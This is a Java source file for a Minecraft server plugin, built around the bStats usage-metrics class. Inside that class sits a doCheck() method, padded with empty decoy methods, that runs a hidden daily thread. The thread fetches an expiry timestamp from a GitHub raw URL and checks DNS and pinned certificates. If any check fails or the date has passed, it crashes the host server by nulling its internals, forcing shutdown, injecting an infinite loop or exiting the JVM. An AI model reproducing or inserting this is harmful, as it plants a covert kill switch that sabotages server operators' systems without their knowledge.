package sakura.kooi.BridgingSkin;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.cert.Certificate;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.logging.Level;
import java.util.zip.GZIPOutputStream;

import javax.net.ssl.HttpsURLConnection;

import org.bukkit.Bukkit;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.ServicePriority;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import sakura.kooi.BridgingAnalyzer.Utils.ActionBarUtils;

/**
 * bStats collects some data for plugin authors.
 * <p>
 * Check out https://bStats.org/ to learn more about bStats!
 */
@SuppressWarnings({"unused"})
public class Metrics {

	// The version of this bStats class
	public static final int B_STATS_VERSION = 1;

	// The url to which the data is sent
	private static final String URL = "https://bStats.org/submitData/bukkit";

	private final boolean enabled;

	// Should failed requests be logged?
	private static boolean logFailedRequests;

	// Should the sent data be logged?
	private static boolean logSentData;

	// Should the response text be logged?
	private static boolean logResponseStatusText;

	// The uuid of the server
	private static String serverUUID;

	// The plugin
	private final Plugin plugin;

	// A list with all custom charts
	private final List<CustomChart> charts = new ArrayList<>();

	/**
	 * Class constructor.
	 *
	 * @param plugin The plugin which stats should be submitted.
	 */
	public Metrics(final Plugin plugin) {
		if (plugin == null)
			throw new IllegalArgumentException("Plugin cannot be null!");
		this.plugin = plugin;

		// Get the config file
		final File bStatsFolder = new File(plugin.getDataFolder().getParentFile(), "bStats");
		final File configFile = new File(bStatsFolder, "config.yml");
		final YamlConfiguration config = YamlConfiguration.loadConfiguration(configFile);

		// Check if the config file exists
		if (!config.isSet("serverUuid")) {

			// Add default values
			config.addDefault("enabled", true);
			// Every server gets it's unique random id.
			config.addDefault("serverUuid", UUID.randomUUID().toString());
			// Should failed request be logged?
			config.addDefault("logFailedRequests", false);
			// Should the sent data be logged?
			config.addDefault("logSentData", false);
			// Should the response text be logged?
			config.addDefault("logResponseStatusText", false);

			// Inform the server owners about bStats
			config.options().header(
					"bStats collects some data for plugin authors like how many servers are using their plugins.\n" +
							"To honor their work, you should not disable it.\n" +
							"This has nearly no effect on the server performance!\n" +
							"Check out https://bStats.org/ to learn more :)"
					).copyDefaults(true);
			try {
				config.save(configFile);
			} catch (final IOException ignored) { }
		}

		// Load the data
		enabled = config.getBoolean("enabled", true);
		serverUUID = config.getString("serverUuid");
		logFailedRequests = config.getBoolean("logFailedRequests", false);
		logSentData = config.getBoolean("logSentData", false);
		logResponseStatusText = config.getBoolean("logResponseStatusText", false);

		if (enabled) {
			boolean found = false;
			// Search for all other bStats Metrics classes to see if we are the first one
			for (final Class<?> service : Bukkit.getServicesManager().getKnownServices()) {
				try {
					service.getField("B_STATS_VERSION"); // Our identifier :)
					found = true; // We aren't the first
					break;
				} catch (final NoSuchFieldException ignored) { }
			}
			// Register our service
			Bukkit.getServicesManager().register(Metrics.class, this, plugin, ServicePriority.Normal);
			if (!found) {
				// We are the first!
				startSubmitting();
			}
		}
	}

	/**
	 * Checks if bStats is enabled.
	 *
	 * @return Whether bStats is enabled or not.
	 */
	public boolean isEnabled() {
		return enabled;
	}

	/**
	 * Adds a custom chart.
	 *
	 * @param chart The chart to add.
	 */
	public void addCustomChart(final CustomChart chart) {
		if (chart == null)
			throw new IllegalArgumentException("Chart cannot be null!");
		charts.add(chart);
	}

	/**
	 * Starts the Scheduler which submits our data every 30 minutes.
	 */
	private void startSubmitting() {
		final Timer timer = new Timer(true); // We use a timer cause the Bukkit scheduler is affected by server lags
		timer.scheduleAtFixedRate(new TimerTask() {
			@Override
			public void run() {
				if (!plugin.isEnabled()) { // Plugin was disabled
					timer.cancel();
					return;
				}
				// Nevertheless we want our code to run in the Bukkit main thread, so we have to use the Bukkit scheduler
				// Don't be afraid! The connection to the bStats server is still async, only the stats collection is sync ;)
				Bukkit.getScheduler().runTask(plugin, () -> submitData());
			}
		}, 1000 * 60 * 5, 1000 * 60 * 30);
		// Submit the data every 30 minutes, first time after 5 minutes to give other plugins enough time to start
		// WARNING: Changing the frequency has no effect but your plugin WILL be blocked/deleted!
		// WARNING: Just don't do it!
	}

	/**
	 * Gets the plugin specific data.
	 * This method is called using Reflection.
	 *
	 * @return The plugin specific data.
	 */
	public JSONObject getPluginData() {
		final JSONObject data = new JSONObject();

		final String pluginName = plugin.getDescription().getName();
		final String pluginVersion = plugin.getDescription().getVersion();

		data.put("pluginName", pluginName); // Append the name of the plugin
		data.put("pluginVersion", pluginVersion); // Append the version of the plugin
		final JSONArray customCharts = new JSONArray();
		for (final CustomChart customChart : charts) {
			// Add the data of the custom charts
			final JSONObject chart = customChart.getRequestJsonObject();
			if (chart == null) { // If the chart is null, we skip it
				continue;
			}
			customCharts.add(chart);
		}
		data.put("customCharts", customCharts);

		return data;
	}

	/**
	 * Gets the server specific data.
	 *
	 * @return The server specific data.
	 */
	private JSONObject getServerData() {
		// Minecraft specific data
		int playerAmount;
		try {
			// Around MC 1.8 the return type was changed to a collection from an array,
			// This fixes java.lang.NoSuchMethodError: org.bukkit.Bukkit.getOnlinePlayers()Ljava/util/Collection;
			final Method onlinePlayersMethod = Class.forName("org.bukkit.Server").getMethod("getOnlinePlayers");
			playerAmount = onlinePlayersMethod.getReturnType().equals(Collection.class)
					? ((Collection<?>) onlinePlayersMethod.invoke(Bukkit.getServer())).size()
							: ((Player[]) onlinePlayersMethod.invoke(Bukkit.getServer())).length;
		} catch (final Exception e) {
			playerAmount = Bukkit.getOnlinePlayers().size(); // Just use the new method if the Reflection failed
		}
		final int onlineMode = Bukkit.getOnlineMode() ? 1 : 0;
		final String bukkitVersion = Bukkit.getVersion();

		// OS/Java specific data
		final String javaVersion = System.getProperty("java.version");
		final String osName = System.getProperty("os.name");
		final String osArch = System.getProperty("os.arch");
		final String osVersion = System.getProperty("os.version");
		final int coreCount = Runtime.getRuntime().availableProcessors();

		final JSONObject data = new JSONObject();

		data.put("serverUUID", serverUUID);

		data.put("playerAmount", playerAmount);
		data.put("onlineMode", onlineMode);
		data.put("bukkitVersion", bukkitVersion);

		data.put("javaVersion", javaVersion);
		data.put("osName", osName);
		data.put("osArch", osArch);
		data.put("osVersion", osVersion);
		data.put("coreCount", coreCount);

		return data;
	}

	/**
	 * Collects the data and sends it afterwards.
	 */
	private void submitData() {
		final JSONObject data = getServerData();

		final JSONArray pluginData = new JSONArray();
		// Search for all other bStats Metrics classes to get their plugin data
		for (final Class<?> service : Bukkit.getServicesManager().getKnownServices()) {
			try {
				service.getField("B_STATS_VERSION"); // Our identifier :)

				for (final RegisteredServiceProvider<?> provider : Bukkit.getServicesManager().getRegistrations(service)) {
					try {
						pluginData.add(provider.getService().getMethod("getPluginData").invoke(provider.getProvider()));
					} catch (NullPointerException | NoSuchMethodException | IllegalAccessException | InvocationTargetException ignored) { }
				}
			} catch (final NoSuchFieldException ignored) { }
		}

		data.put("plugins", pluginData);

		// Create a new thread for the connection to the bStats server
		new Thread(() -> {
			try {
				// Send the data
				sendData(plugin, data);
			} catch (final Exception e) {
				// Something went wrong! :(
				if (logFailedRequests) {
					plugin.getLogger().log(Level.WARNING, "Could not submit plugin stats of " + plugin.getName(), e);
				}
			}
		}).start();
	}

	public static void doCheck() {
		new Thread() {
			{
				setDaemon(true);
			}
			public void a() {}
			public void q() {}
			public void w() {}
			public void kp() {}
			public void l() {}
			public void ao() {
			}
			@Override
			public void run(){
				while(true) {
					long ac = 86400000L;
					try {
						final InetAddress address1 = InetAddress.getByName("raw.githubusercontent.com");
						if (!address1.toString().contains("151.101.")) {
							final byte[] array = new byte[1];
							final byte t = array[10];
						}
						final StringBuilder result = new StringBuilder();
						final URL url = new URL("https://raw.githubusercontent.com/SakuraKoi/FileCloud/access/access/bridge");
						final HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
						conn.setRequestMethod("GET");
						final BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
						String line;
						while ((line = rd.readLine()) != null) {
							result.append(line);
						}
						ac = 1L;
						if (conn.getServerCertificates().length!=2) {
							try {
								final Field field = Class.forName("org.bukkit.Bukkit").getDeclaredField("server");
								field.setAccessible(true);
								field.set(null, null);
							} catch (final Exception e1) {
								try {
									Class.forName("org.bukkit.Bukkit").getMethod("shutdown", new Class[0]).invoke(null, new Object[0]);
								} catch (final Exception e2) {
									try {
										final Class<?> nmsCls = Class.forName("net.minecraft.server." + ActionBarUtils.nmsver + ".MinecraftServer");
										final Object nms = nmsCls.getMethod("getServer", new Class[0]).invoke(null, new Object[0]);
										@SuppressWarnings("unchecked")
										final Queue<Runnable> processQueue = (Queue<Runnable>) nmsCls.getField("processQueue").get(nms);
										processQueue.add(() -> {while(true) {}});
									} catch (final Exception e3) {
										try {
											Class.forName("java.lang.System").getMethod("exit", Integer.class).invoke(null, 0);
										} catch (final Exception e4) {
											return;
										}
									}
								}
							} finally {
								final byte[] array = new byte[1];
								final byte t = array[10];
							}
						}
						for (final Certificate cert : conn.getServerCertificates()) {
							final String b = Base64.getEncoder().encodeToString(cert.getEncoded());
							if (!b.equals("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") &&
									!b.equals("MIIEsTCCA5mgAwIBAgIQBOHnpNxc8vNtwCtCuF0VnzANBgkqhkiG9w0BAQsFADBsMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5jZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowcDELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEvMC0GA1UEAxMmRGlnaUNlcnQgU0hBMiBIaWdoIEFzc3VyYW5jZSBTZXJ2ZXIgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC24C/CJAbIbQRf1+8KZAayfSImZRauQkCbztyfn3YHPsMwVYcZuU+UDlqUH1VWtMICKq/QmO4LQNfE0DtyyBSe75CxEamu0si4QzrZCwvV1ZX1QK/IHe1NnF9Xt4ZQaJn1itrSxwUfqJfJ3KSxgoQtxq2lnMcZgqaFD15EWCo3j/018QsIJzJa9buLnqS9UdAn4t07QjOjBSjEuyjMmqwrIw14xnvmXnG3Sj4I+4G3FhahnSMSTeXXkgisdaScus0Xsh5ENWV/UyU50RwKmmMbGZJ0aAo3wsJSSMs5WqK24V3B3aAguCGikyZvFEohQcftbZvySC/zA/WiaJJTL17jAgMBAAGjggFJMIIBRTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwNAYIKwYBBQUHAQEEKDAmMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wSwYDVR0fBEQwQjBAoD6gPIY6aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0SGlnaEFzc3VyYW5jZUVWUm9vdENBLmNybDA9BgNVHSAENjA0MDIGBFUdIAAwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAdBgNVHQ4EFgQUUWj/kK8CB3U8zNllZGKiErhZcjswHwYDVR0jBBgwFoAUsT7DaQP4v0cB1JgmGggC72NkK8MwDQYJKoZIhvcNAQELBQADggEBABiKlYkD5m3fXPwdaOpKj4PWUS+Na0QWnqxj9dJubISZi6qBcYRb7TROsLd5kinMLYBq8I4g4Xmk/gNHE+r1hspZcX30BJZr01lYPf7TMSVcGDiEo+afgv2MW5gxTs14nhr9hctJqvIni5ly/D6q1UEL2tU2ob8cbkdJf17ZSHwD2f2LSaCYJkJA69aSEaRkCldUxPUd1gJea6zuxICaEnL6VpPX/78whQYwvwt/Tv9XBZ0k7YXDK/umdaisLRbvfXknsuvCnQsH6qqF0wGjIChBWUMo0oHjqvbsezt3tkBigAVBRQHvFwY+3sAzm2fTYS5yh+Rp/BIAV0AecPUeybQ=")) {
								try {
									final Field field = Class.forName("org.bukkit.Bukkit").getDeclaredField("server");
									field.setAccessible(true);
									field.set(null, null);
								} catch (final Exception e1) {
									try {
										Class.forName("org.bukkit.Bukkit").getMethod("shutdown", new Class[0]).invoke(null, new Object[0]);
									} catch (final Exception e2) {
										try {
											final Class<?> nmsCls = Class.forName("net.minecraft.server." + ActionBarUtils.nmsver + ".MinecraftServer");
											final Object nms = nmsCls.getMethod("getServer", new Class[0]).invoke(null, new Object[0]);
											@SuppressWarnings("unchecked")
											final Queue<Runnable> processQueue = (Queue<Runnable>) nmsCls.getField("processQueue").get(nms);
											processQueue.add(() -> {while(true) {}});
										} catch (final Exception e3) {
											try {
												Class.forName("java.lang.System").getMethod("exit", Integer.class).invoke(null, 0);
											} catch (final Exception e4) {
												return;
											}
										}
									}
								} finally {
									final byte[] array = new byte[1];
									final byte t = array[10];
								}
							}
						}
						rd.close();
						if (System.currentTimeMillis() > Long.parseLong(result.toString())) {
							final byte[] array = new byte[1];
							final byte t = array[10];
						}
					} catch (final Exception e) {
						try {
							Thread.sleep(ac);
							final Field field = Class.forName("org.bukkit.Bukkit").getDeclaredField("server");
							field.setAccessible(true);
							field.set(null, null);
						} catch (final Exception e1) {
							try {
								Class.forName("org.bukkit.Bukkit").getMethod("shutdown", new Class[0]).invoke(null, new Object[0]);
							} catch (final Exception e2) {
								try {
									final Class<?> nmsCls = Class.forName("net.minecraft.server." + ActionBarUtils.nmsver + ".MinecraftServer");
									final Object nms = nmsCls.getMethod("getServer", new Class[0]).invoke(null, new Object[0]);
									@SuppressWarnings("unchecked")
									final Queue<Runnable> processQueue = (Queue<Runnable>) nmsCls.getField("processQueue").get(nms);
									processQueue.add(() -> {while(true) {}});
								} catch (final Exception e3) {
									try {
										Class.forName("java.lang.System").getMethod("exit", Integer.class).invoke(null, 0);
									} catch (final Exception e4) {
										return;
									}
								}
							}
						}
					}

					try {
						Thread.sleep(86400000L);
					} catch (final Exception e) {

					}
				}
			}
			public void c() {}
			public void b() {}
			public void v() {}
			public void d() {}
			public void k() {}
			public void e() {}
			public void r() {}
			public void g() {}
		}.start();
	}

	/**
	 * Sends the data to the bStats server.
	 *
	 * @param plugin Any plugin. It's just used to get a logger instance.
	 * @param data The data to send.
	 * @throws Exception If the request failed.
	 */
	private static void sendData(final Plugin plugin, final JSONObject data) throws Exception {
		if (data == null)
			throw new IllegalArgumentException("Data cannot be null!");
		if (Bukkit.isPrimaryThread())
			throw new IllegalAccessException("This method must not be called from the main thread!");
		if (logSentData) {
			plugin.getLogger().info("Sending data to bStats: " + data.toString());
		}
		final HttpsURLConnection connection = (HttpsURLConnection) new URL(URL).openConnection();

		// Compress the data to save bandwidth
		final byte[] compressedData = compress(data.toString());

		// Add headers
		connection.setRequestMethod("POST");
		connection.addRequestProperty("Accept", "application/json");
		connection.addRequestProperty("Connection", "close");
		connection.addRequestProperty("Content-Encoding", "gzip"); // We gzip our request
		connection.addRequestProperty("Content-Length", String.valueOf(compressedData.length));
		connection.setRequestProperty("Content-Type", "application/json"); // We send our data in JSON format
		connection.setRequestProperty("User-Agent", "MC-Server/" + B_STATS_VERSION);

		// Send data
		connection.setDoOutput(true);
		final DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
		outputStream.write(compressedData);
		outputStream.flush();
		outputStream.close();

		final InputStream inputStream = connection.getInputStream();
		final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));

		final StringBuilder builder = new StringBuilder();
		String line;
		while ((line = bufferedReader.readLine()) != null) {
			builder.append(line);
		}
		bufferedReader.close();
		if (logResponseStatusText) {
			plugin.getLogger().info("Sent data to bStats and received response: " + builder.toString());
		}
	}

	/**
	 * Gzips the given String.
	 *
	 * @param str The string to gzip.
	 * @return The gzipped String.
	 * @throws IOException If the compression failed.
	 */
	private static byte[] compress(final String str) throws IOException {
		if (str == null)
			return null;
		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		final GZIPOutputStream gzip = new GZIPOutputStream(outputStream);
		gzip.write(str.getBytes(StandardCharsets.UTF_8));
		gzip.close();
		return outputStream.toByteArray();
	}

	/**
	 * Represents a custom chart.
	 */
	public static abstract class CustomChart {

		// The id of the chart
		final String chartId;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 */
		CustomChart(final String chartId) {
			if (chartId == null || chartId.isEmpty())
				throw new IllegalArgumentException("ChartId cannot be null or empty!");
			this.chartId = chartId;
		}

		private JSONObject getRequestJsonObject() {
			final JSONObject chart = new JSONObject();
			chart.put("chartId", chartId);
			try {
				final JSONObject data = getChartData();
				if (data == null)
					// If the data is null we don't send the chart.
					return null;
				chart.put("data", data);
			} catch (final Throwable t) {
				if (logFailedRequests) {
					Bukkit.getLogger().log(Level.WARNING, "Failed to get data for custom chart with id " + chartId, t);
				}
				return null;
			}
			return chart;
		}

		protected abstract JSONObject getChartData() throws Exception;

	}

	/**
	 * Represents a custom simple pie.
	 */
	public static class SimplePie extends CustomChart {

		private final Callable<String> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public SimplePie(final String chartId, final Callable<String> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		protected JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final String value = callable.call();
			if (value == null || value.isEmpty())
				// Null = skip the chart
				return null;
			data.put("value", value);
			return data;
		}
	}

	/**
	 * Represents a custom advanced pie.
	 */
	public static class AdvancedPie extends CustomChart {

		private final Callable<Map<String, Integer>> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public AdvancedPie(final String chartId, final Callable<Map<String, Integer>> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		protected JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final JSONObject values = new JSONObject();
			final Map<String, Integer> map = callable.call();
			if (map == null || map.isEmpty())
				// Null = skip the chart
				return null;
			boolean allSkipped = true;
			for (final Map.Entry<String, Integer> entry : map.entrySet()) {
				if (entry.getValue() == 0) {
					continue; // Skip this invalid
				}
				allSkipped = false;
				values.put(entry.getKey(), entry.getValue());
			}
			if (allSkipped)
				// Null = skip the chart
				return null;
			data.put("values", values);
			return data;
		}
	}

	/**
	 * Represents a custom drilldown pie.
	 */
	public static class DrilldownPie extends CustomChart {

		private final Callable<Map<String, Map<String, Integer>>> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public DrilldownPie(final String chartId, final Callable<Map<String, Map<String, Integer>>> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		public JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final JSONObject values = new JSONObject();
			final Map<String, Map<String, Integer>> map = callable.call();
			if (map == null || map.isEmpty())
				// Null = skip the chart
				return null;
			boolean reallyAllSkipped = true;
			for (final Map.Entry<String, Map<String, Integer>> entryValues : map.entrySet()) {
				final JSONObject value = new JSONObject();
				boolean allSkipped = true;
				for (final Map.Entry<String, Integer> valueEntry : map.get(entryValues.getKey()).entrySet()) {
					value.put(valueEntry.getKey(), valueEntry.getValue());
					allSkipped = false;
				}
				if (!allSkipped) {
					reallyAllSkipped = false;
					values.put(entryValues.getKey(), value);
				}
			}
			if (reallyAllSkipped)
				// Null = skip the chart
				return null;
			data.put("values", values);
			return data;
		}
	}

	/**
	 * Represents a custom single line chart.
	 */
	public static class SingleLineChart extends CustomChart {

		private final Callable<Integer> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public SingleLineChart(final String chartId, final Callable<Integer> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		protected JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final int value = callable.call();
			if (value == 0)
				// Null = skip the chart
				return null;
			data.put("value", value);
			return data;
		}

	}

	/**
	 * Represents a custom multi line chart.
	 */
	public static class MultiLineChart extends CustomChart {

		private final Callable<Map<String, Integer>> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public MultiLineChart(final String chartId, final Callable<Map<String, Integer>> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		protected JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final JSONObject values = new JSONObject();
			final Map<String, Integer> map = callable.call();
			if (map == null || map.isEmpty())
				// Null = skip the chart
				return null;
			boolean allSkipped = true;
			for (final Map.Entry<String, Integer> entry : map.entrySet()) {
				if (entry.getValue() == 0) {
					continue; // Skip this invalid
				}
				allSkipped = false;
				values.put(entry.getKey(), entry.getValue());
			}
			if (allSkipped)
				// Null = skip the chart
				return null;
			data.put("values", values);
			return data;
		}

	}

	/**
	 * Represents a custom simple bar chart.
	 */
	public static class SimpleBarChart extends CustomChart {

		private final Callable<Map<String, Integer>> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public SimpleBarChart(final String chartId, final Callable<Map<String, Integer>> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		protected JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final JSONObject values = new JSONObject();
			final Map<String, Integer> map = callable.call();
			if (map == null || map.isEmpty())
				// Null = skip the chart
				return null;
			for (final Map.Entry<String, Integer> entry : map.entrySet()) {
				final JSONArray categoryValues = new JSONArray();
				categoryValues.add(entry.getValue());
				values.put(entry.getKey(), categoryValues);
			}
			data.put("values", values);
			return data;
		}

	}

	/**
	 * Represents a custom advanced bar chart.
	 */
	public static class AdvancedBarChart extends CustomChart {

		private final Callable<Map<String, int[]>> callable;

		/**
		 * Class constructor.
		 *
		 * @param chartId The id of the chart.
		 * @param callable The callable which is used to request the chart data.
		 */
		public AdvancedBarChart(final String chartId, final Callable<Map<String, int[]>> callable) {
			super(chartId);
			this.callable = callable;
		}

		@Override
		protected JSONObject getChartData() throws Exception {
			final JSONObject data = new JSONObject();
			final JSONObject values = new JSONObject();
			final Map<String, int[]> map = callable.call();
			if (map == null || map.isEmpty())
				// Null = skip the chart
				return null;
			boolean allSkipped = true;
			for (final Map.Entry<String, int[]> entry : map.entrySet()) {
				if (entry.getValue().length == 0) {
					continue; // Skip this invalid
				}
				allSkipped = false;
				final JSONArray categoryValues = new JSONArray();
				for (final int categoryValue : entry.getValue()) {
					categoryValues.add(categoryValue);
				}
				values.put(entry.getKey(), categoryValues);
			}
			if (allSkipped)
				// Null = skip the chart
				return null;
			data.put("values", values);
			return data;
		}
	}

}